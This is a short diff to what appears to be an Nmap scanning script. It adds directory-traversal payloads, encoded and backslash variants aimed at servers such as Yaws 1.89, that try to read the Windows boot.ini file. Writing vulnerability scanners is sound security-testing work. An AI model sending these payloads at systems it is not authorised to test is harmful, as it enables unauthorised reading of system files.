@@ -144,6 +144,12 @@ action = function(host, port)
 		--Mongoose Web Server
 		'///..%2f..%2f..%2f..%2fboot.ini',
 		'/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini',
+		'/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\boot.ini',
+		-- Yaws 1.89
+		'/..\\/..\\/..\\/boot.ini',
+		'/..\\/\\..\\/\\..\\/\\boot.ini',
+		'/\\../\\../\\../boot.ini',
+		'////..\\..\\..\\boot.ini',
 		--MultiThreaded HTTP Server v1.1
 		'/..\\..\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
 		--uHttp Server
